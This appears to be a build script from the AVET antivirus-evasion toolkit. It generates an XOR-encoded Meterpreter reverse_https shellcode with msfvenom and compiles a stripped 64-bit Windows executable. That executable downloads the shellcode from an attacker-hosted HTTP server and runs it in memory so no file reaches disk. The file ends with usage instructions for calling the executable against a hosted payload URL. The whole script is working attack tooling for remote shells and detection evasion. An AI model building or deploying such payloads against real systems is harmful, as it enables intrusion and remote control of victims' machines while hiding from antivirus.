#!/bin/bash


#DESCRIPTION_START
# Downloads and executes 64-bit shellcode, using sockets. Applies metasploit XOR encoding.
#DESCRIPTION_END


# print AVET logo
cat banner.txt

# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# no command preexec
set_command_source no_data
set_command_exec no_command
# enable debug output
enable_debug_print
#CONFIGURATION_END


# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -b '\x00' -f raw --platform Windows > output/thepayload.bin

# set shellcode source
set_payload_source download_socket

# set decoder and key source
set_decoder none
set_key_source no_data

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode64

# compile
$win64_compiler -o output/downloadsocket_mtrprtrxor_revhttps_win64.exe source/avet.c -lwsock32 -lws2_32
strip output/downloadsocket_mtrprtrxor_revhttps_win64.exe

# cleanup
cleanup_techniques


echo "
# The generated msf shellcode file needs to be hosted on a HTTP server
# Call the executable like:
# $ downloadsocket_mtrprtrxor_revhttps_win64.exe http://yourserver/thepayload.bin
# The executable downloads the shellcode into memory (no file is dropped on disk) and executes it.
"
